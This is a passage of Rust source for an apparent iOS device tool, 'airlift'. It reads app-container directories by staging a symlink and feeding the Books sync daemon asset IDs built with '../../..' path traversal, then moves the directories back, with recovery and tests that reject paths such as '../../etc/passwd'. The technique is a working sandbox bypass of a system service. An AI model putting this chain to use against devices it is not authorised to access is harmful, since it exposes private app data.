        "airlift: listing '{target_abs}' via pull/restore (token {token}, pull {pull_dir}, link {link_dest})"
    ));

    let (mut tunnel, mut afc) = open_session(pairing_path, logger).await?;
    let backup = BooksSyncBackup::capture(&mut afc, &token, logger).await;
    match backup.save_to_temp() {
        Ok(path) => logger.log(format!("airlift: sync-state snapshot saved to {path:?}")),
        Err(e) => logger.log(format!("airlift: could not save sync-state snapshot: {e}")),
    }

    // ── STEP A: stage the restore symlink ──────────────────────────────────
    if let Err(e) = stage_restore_symlink(
        &mut tunnel,
        &mut afc,
        &pull_dir,
        &link_target_for_parent(&parent),
        logger,
    )
    .await
    {
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(format!("STEP A failed: {e}"));
    }

    // ── STEP B: pull the directory into Airlock/Read/<T> (one ATC session) ──
    if let Err(e) = write_books_plist(&mut afc, std::slice::from_ref(&asset_id_pull), logger).await {
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(format!("STEP B manifest failed: {e}"));
    }
    if let Err(e) = atc_asset_sync(
        &mut tunnel,
        &[asset_id_pull],
        &[read_dir.clone()],
        "STEP B pull",
        logger,
    )
    .await
    {
        // The daemon may still have moved the directory even though the session
        // reported an error, so check before touching anything.
        let record = RecoveryRecord {
            target: target_abs.to_owned(),
            token: token.clone(),
            basename: basename.clone(),
            parent: parent.clone(),
        };
        if afc.get_file_info(read_dir.clone()).await.is_ok() {
            let _ = write_recovery_record(&mut afc, &record, logger).await;
        }
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = afc.remove_all(link_dest.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(format!("STEP B pull failed: {e}"));
    }

    // The listing *is* the verification: if Airlock/Read/<T> is listable, the
    // pull landed.
    let listing = match list_dir_json(&mut afc, &read_dir).await {
        Ok(json) => json,
        Err(e) => {
            let record = RecoveryRecord {
                target: target_abs.to_owned(),
                token: token.clone(),
                basename: basename.clone(),
                parent: parent.clone(),
            };
            if afc.get_file_info(read_dir.clone()).await.is_ok() {
                let _ = write_recovery_record(&mut afc, &record, logger).await;
            }
            let _ = backup.restore(&mut afc, logger).await;
            return Err(format!(
                "STEP B: {read_dir} is not listable after the pull ({e}); target '{target_abs}' may still be in place"
            ));
        }
    };
    logger.log(format!("airlift: STEP B pulled '{target_abs}' to {read_dir}"));
    if listing == "[]" {
        logger.log(format!(
            "airlift: STEP B listing of {read_dir} is empty — the target directory was empty, or the daemon created an empty directory instead of moving it; restoring it back either way"
        ));
    }

    // ── STEP D (first half): restore the sync state, then the recovery record ──
    // The STEP C manifest is written below anyway, so a restore problem here is
    // not fatal — but it is worth surfacing, and the final restore runs again.
    if let Err(e) = backup.restore(&mut afc, logger).await {
        logger.log(format!(
            "airlift: warning: Books sync state could not be restored after STEP B ({e}); continuing to STEP C"
        ));
    }

    // The recovery record has to be on disk *before* the restore is attempted,
    // otherwise an interrupted restore is unrecoverable.
    let record = RecoveryRecord {
        target: target_abs.to_owned(),
        token: token.clone(),
        basename: basename.clone(),
        parent: parent.clone(),
    };
    if let Err(e) = write_recovery_record(&mut afc, &record, logger).await {
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(kept_at_error(
            &token,
            &format!(
                "the recovery record could not be written ({e}), so al_airlift_recover cannot finish this one automatically"
            ),
        ));
    }

    // ── STEP C: restore (two FileCompletes in ONE session, symlink first) ──
    let restore_result = async {
        write_books_plist(
            &mut afc,
            &[asset_id_link.clone(), asset_id_read.clone()],
            logger,
        )
        .await?;
        atc_asset_sync(
            &mut tunnel,
            &[asset_id_link, asset_id_read],
            &[link_dest.clone(), format!("{link_dest}/{basename}")],
            "STEP C restore",
            logger,
        )
        .await
    }
    .await;

    if let Err(e) = restore_result {
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(kept_at_error(&token, &format!("STEP C restore failed: {e}")));
    }

    // Only delete the parked copy once AFC confirms it is back at the link
    // destination. A restore that silently created an empty destination would
    // otherwise destroy the target's contents.
    let restored = format!("{link_dest}/{basename}");
    if afc.get_file_info(restored.clone()).await.is_err() {
        logger.log(format!(
            "airlift: STEP C did not place {basename} at {restored}; leaving the parked copy in place"
        ));
        let _ = afc.remove_all(pull_dir.clone()).await;
        let _ = backup.restore(&mut afc, logger).await;
        return Err(kept_at_error(
            &token,
            &format!("restore destination {restored} was not created"),
        ));
    }

    // ── STEP D (second half): cleanup + Books sync-state restore ────────────
    remove_quietly(&mut afc, &read_dir, logger).await;
    remove_quietly(&mut afc, &record_path, logger).await;
    remove_quietly(&mut afc, &pull_dir, logger).await;
    remove_quietly(&mut afc, &link_dest, logger).await;
    let restore_err = backup.restore(&mut afc, logger).await.err();

    logger.log(format!("airlift: '{target_abs}' restored and staging cleaned up"));
    if let Some(e) = restore_err {
        logger.log(format!("airlift: warning: {e}"));
    }
    Ok(listing)
}

// ---------------------------------------------------------------------------
// Recovery
// ---------------------------------------------------------------------------

/// Finish a restore whose record survived in `Airlock/Read/<T>.json`.
///
/// Best-effort per record: each one stages a *fresh* symlink zip under a new
/// token (`airlift-pull-<T2>` / `airlift-link-<T2>`) and replays STEP C only —
/// the directory is already parked at `Airlock/Read/<T>`.
async fn restore_record(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    record: &RecoveryRecord,
    logger: &Logger,
) -> serde_json::Value {
    let mut result = serde_json::json!({ "target": record.target, "token": record.token });
    let parked = format!("{AIRLOCK_READ}/{}", record.token);

    if let Err(e) = record.validate() {
        result["status"] = serde_json::Value::String("rejected".to_owned());
        result["error"] = serde_json::Value::String(e);
        return result;
    }

    if afc.get_file_info(parked.clone()).await.is_err() {
        result["status"] = serde_json::Value::String("missing".to_owned());
        result["error"] = serde_json::Value::String(format!(
            "{parked} is gone; nothing left to restore"
        ));
        return result;
    }

    let token2 = random_hex(10);
    let pull_dir = format!("{PULL_PREFIX}{token2}");
    let link_dest = format!("{LINK_PREFIX}{token2}");
    let asset_id_link = media_asset_id(&format!("{pull_dir}/{LINK_ENTRY}"));
    let asset_id_read = media_asset_id(&parked);

    let outcome = async {
        stage_restore_symlink(
            tunnel,
            afc,
            &pull_dir,
            &link_target_for_parent(&record.parent),
            logger,
        )
        .await?;
        write_books_plist(afc, &[asset_id_link.clone(), asset_id_read.clone()], logger).await?;
        atc_asset_sync(
            tunnel,
            &[asset_id_link, asset_id_read],
            &[link_dest.clone(), format!("{link_dest}/{}", record.basename)],
            "recover",
            logger,
        )
        .await
    }
    .await;

    let restored_at = format!("{link_dest}/{}", record.basename);
    match outcome {
        Ok(()) if afc.get_file_info(restored_at.clone()).await.is_ok() => {
            remove_quietly(afc, &parked, logger).await;
            remove_quietly(afc, &format!("{parked}.json"), logger).await;
            remove_quietly(afc, &pull_dir, logger).await;
            remove_quietly(afc, &link_dest, logger).await;
            result["status"] = serde_json::Value::String("restored".to_owned());
        }
        Ok(()) => {
            remove_quietly(afc, &pull_dir, logger).await;
            result["status"] = serde_json::Value::String("failed".to_owned());
            result["error"] = serde_json::Value::String(format!(
                "restore destination {restored_at} was not created; data kept at {parked}"
            ));
        }
        Err(e) => {
            remove_quietly(afc, &pull_dir, logger).await;
            result["status"] = serde_json::Value::String("failed".to_owned());
            result["error"] = serde_json::Value::String(format!(
                "{e}; data kept at {parked}"
            ));
        }
    }
    result
}

/// Scan `Airlock/Read` for `*.json` recovery records and finish each of them.
async fn recover_read_dirs(pairing_path: &str, logger: &Logger) -> Result<String, String> {
    let (mut tunnel, mut afc) = open_session(pairing_path, logger).await?;

    let names = afc
        .list_dir(AIRLOCK_READ)
        .await
        .map_err(|e| format!("AFC list {AIRLOCK_READ}: {e:?}"))?;
    let records: Vec<String> = names
        .into_iter()
        .filter(|name| !name.is_empty() && name != "." && name != "..")
        .filter(|name| name.ends_with(".json"))
        .collect();
    if records.is_empty() {
        logger.log(format!("airlift: no recovery records in {AIRLOCK_READ}"));
        return Ok(serde_json::Value::Array(Vec::new()).to_string());
    }

    logger.log(format!(
        "airlift: recovering {} parked director{} from {AIRLOCK_READ}",
        records.len(),
        if records.len() == 1 { "y" } else { "ies" }
    ));

    let mut results: Vec<serde_json::Value> = Vec::with_capacity(records.len());
    for name in records {
        let path = format!("{AIRLOCK_READ}/{name}");
        let backup = BooksSyncBackup::capture(&mut afc, &random_hex(10), logger).await;
        let record = match read_recovery_record(&mut afc, &path, logger).await {
            Ok(record) => record,
            Err(e) => {
                let mut result = serde_json::json!({ "record": path, "status": "unreadable" });
                result["error"] = serde_json::Value::String(e);
                results.push(result);
                continue;
            }
        };
        let result = restore_record(&mut tunnel, &mut afc, &record, logger).await;
        let _ = backup.restore(&mut afc, logger).await;
        results.push(result);
    }

    Ok(serde_json::Value::Array(results).to_string())
}

async fn read_recovery_record(
    afc: &mut AfcClient,
    path: &str,
    logger: &Logger,
) -> Result<RecoveryRecord, String> {
    let mut fd = afc
        .open(path.to_owned(), AfcFopenMode::RdOnly)
        .await
        .map_err(|e| format!("AFC open {path}: {e:?}"))?;
    let read = fd.read_entire().await;
    let _ = fd.close().await;
    let bytes = read.map_err(|e| format!("AFC read {path}: {e:?}"))?;
    serde_json::from_slice::<RecoveryRecord>(&bytes)
        .map_err(|e| format!("{path} is not an airlift recovery record: {e}"))
        .map_err(|e| {
            logger.log(format!("airlift: {e}"));
            e
        })
}

// ---------------------------------------------------------------------------
// FFI entry points
// ---------------------------------------------------------------------------

/// List a directory anywhere under an app container without HouseArrest.
///
/// `path` is a real device path (`/var/mobile/Containers/…`,
/// `/var/mobile/Applications/…`). `out_json` receives exactly what
/// `al_dir_list` emits: `[{"name":…,"is_dir":…,"size":…}, …]`.
///
/// Blocks for several seconds (two ATC syncs). On failure after the pull has
/// succeeded the error string contains `kept at Airlock/Read/<T>` so the caller
/// can offer `al_airlift_recover`.
///
/// # Safety
/// All pointer args must be null or valid for their documented use.
pub unsafe fn list_dir(
    pairing_path: *const c_char,
    path: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    if out_json.is_null() && out_error.is_null() {
        return 2;
    }
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let requested = opt_str(path, "");
    let ctx_usize = ctx as usize;

    let res = run_with_large_stack("al_airlift_list_dir", move || {
        let logger = Logger::new(log_cb, ctx_usize as *mut c_void);
        let target = checked_pull_path(&requested)?;
        // One ATC sync at a time, process-wide, shared with the AFC browser.
        let _guard = lock_tunnel("al_airlift_list_dir");
        idevice_ffi::run_sync_local(pull_list_and_restore(&pairing_path, &target, &logger))
    });

    finish_string_result(res, "al_airlift_list_dir", out_json, out_error)
}

/// Finish every interrupted pull still parked in `Airlock/Read`.
///
/// `out_json` receives `[{"target":…,"token":…,"status":"restored"|"failed"|"missing"|…, …}]`.
///
/// # Safety
/// All pointer args must be null or valid for their documented use.
pub unsafe fn recover(
    pairing_path: *const c_char,
    log_cb: ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    if out_json.is_null() && out_error.is_null() {
        return 2;
    }
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let ctx_usize = ctx as usize;

    let res = run_with_large_stack("al_airlift_recover", move || {
        let logger = Logger::new(log_cb, ctx_usize as *mut c_void);
        let _guard = lock_tunnel("al_airlift_recover");
        idevice_ffi::run_sync_local(recover_read_dirs(&pairing_path, &logger))
    });

    finish_string_result(res, "al_airlift_recover", out_json, out_error)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::{
        asset_id_for_device_path, checked_pull_path, link_target_for_parent,
        media_asset_id, parent_and_basename, BackupState, BooksSyncBackup, RecoveryRecord,
    };

    const UUID_DIR: &str = "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000/Documents";

    #[test]
    fn container_paths_are_accepted() {
        assert_eq!(checked_pull_path(UUID_DIR).unwrap(), UUID_DIR);
        assert_eq!(
            checked_pull_path("/var/mobile/Containers/Shared/AppGroup/GROUP/Library/Caches")
                .unwrap(),
            "/var/mobile/Containers/Shared/AppGroup/GROUP/Library/Caches"
        );
        assert_eq!(
            checked_pull_path("/var/mobile/Applications/Some.app/PlugIns").unwrap(),
            "/var/mobile/Applications/Some.app/PlugIns"
        );
        assert_eq!(
            checked_pull_path("/var/mobile/Containers/Data/Application").unwrap(),
            "/var/mobile/Containers/Data/Application"
        );
    }

    #[test]
    fn paths_are_normalised() {
        assert_eq!(
            checked_pull_path(&format!("/private{UUID_DIR}")).unwrap(),
            UUID_DIR
        );
        assert_eq!(
            checked_pull_path(&format!("{UUID_DIR}/")).unwrap(),
            UUID_DIR
        );
        assert_eq!(
            checked_pull_path(&format!("{UUID_DIR}//Library//Caches")).unwrap(),
            format!("{UUID_DIR}/Library/Caches")
        );
    }

    #[test]
    fn everything_outside_the_containers_is_refused() {
        for bad in [
            "",
            "var/mobile/Containers/Data/Application",
            "/var/mobile/Containers/Data/Application/../Library",
            "/var/mobile/Containers/Data/ApplicationX/foo",
            "/var/mobile/Media/Books/Sync",
            "/var/mobile/Media",
            "/var/mobile/Library/SpringBoard",
            "/etc",
            "/var/tmp",
            "/var/mobile",
            "/private/var/mobile/Library",
            "/var/mobile/Airlock/Read",
        ] {
            assert!(
                checked_pull_path(bad).is_err(),
                "{bad} should be refused"
            );
        }
    }

    #[test]
    fn asset_ids_use_the_books_sync_base() {
        // ../../.. is /var/mobile, so the tail must be relative to it.
        assert_eq!(
            asset_id_for_device_path(UUID_DIR).unwrap(),
            "../../../Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000/Documents"
        );
        assert_eq!(
            asset_id_for_device_path("/var/mobile/Applications/Some.app").unwrap(),
            "../../../Applications/Some.app"
        );
        // The Media-root spelling is two levels up only.
        assert_eq!(media_asset_id("airlift-pull-abc/p0/p1/p2/link"), "../../airlift-pull-abc/p0/p1/p2/link");
        assert_eq!(media_asset_id("Airlock/Read/abc"), "../../Airlock/Read/abc");
        assert!(asset_id_for_device_path("/etc/passwd").is_err());
        assert!(asset_id_for_device_path("/var/mobile").is_err());
    }

    #[test]
    fn link_target_is_three_levels_up_from_the_media_root() {
        let parent = "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000";
        assert_eq!(
            link_target_for_parent(parent),
            "../../../var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000"
        );
    }

    #[test]
    fn parent_and_basename_split() {
        assert_eq!(
            parent_and_basename(UUID_DIR).unwrap(),
            (
                "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000".to_owned(),
                "Documents".to_owned()
            )
        );
        assert!(parent_and_basename("/var/mobile").is_err());
        assert!(parent_and_basename("/").is_err());
    }

    #[test]
    fn backup_json_round_trips() {
        let backup = BooksSyncBackup {
            token: "abc".to_owned(),
            entries: vec![
                (
                    "Books/Sync/Books.plist".to_owned(),
                    BackupState::Present { data_b64: "AAEC".to_owned() },
                ),
                ("Books/Sync/Upload.plist".to_owned(), BackupState::Absent),
                (
                    "Books/Sync/Database/OutstandingAssets_4.sqlite".to_owned(),
                    BackupState::Untouched,
                ),
            ],
        };
        let bytes = serde_json::to_vec(&backup).unwrap();
        let parsed: BooksSyncBackup = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(parsed.token, backup.token);
        assert_eq!(parsed.entries, backup.entries);
    }

    #[test]
    fn recovery_record_round_trips() {
        let record = RecoveryRecord {
            target: UUID_DIR.to_owned(),
            token: "abc123".to_owned(),
            basename: "Documents".to_owned(),
            parent: "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000"
                .to_owned(),
        };
        let bytes = serde_json::to_vec(&record).unwrap();
        let parsed: RecoveryRecord = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(parsed.target, record.target);
        assert_eq!(parsed.token, record.token);
        assert_eq!(parsed.basename, record.basename);
        assert_eq!(parsed.parent, record.parent);
        assert!(record.validate().is_ok());
    }

    #[test]
    fn tampered_recovery_records_are_rejected() {
        let good = RecoveryRecord {
            target: UUID_DIR.to_owned(),
            token: "abc123".to_owned(),
            basename: "Documents".to_owned(),
            parent: "/var/mobile/Containers/Data/Application/DEADBEEF-0000-0000-0000-000000000000"
                .to_owned(),
        };
        let mut record = good.clone();
        record.parent = "/etc".to_owned();
        assert!(record.validate().is_err());

        let mut record = good.clone();
        record.parent = "/var/mobile/Library".to_owned();
        assert!(record.validate().is_err(), "parent must be a container root");

        let mut record = good.clone();
        record.target = "/var/mobile/Library/SpringBoard".to_owned();
        assert!(record.validate().is_err(), "target must live in the parent");

        let mut record = good.clone();
        record.basename = "../../etc".to_owned();
        assert!(record.validate().is_err());

        let mut record = good.clone();
        record.basename = "Other".to_owned();
        assert!(record.validate().is_err());

        let mut record = good;
        record.token = "../../etc/passwd".to_owned();
        assert!(record.validate().is_err());
    }

    #[test]
    fn kept_at_error_mentions_the_recovery_entry_point() {
        let message = super::kept_at_error("deadbeef", "boom");
        assert!(message.contains("kept at Airlock/Read/deadbeef"));
        assert!(message.contains("al_airlift_recover"));
    }
}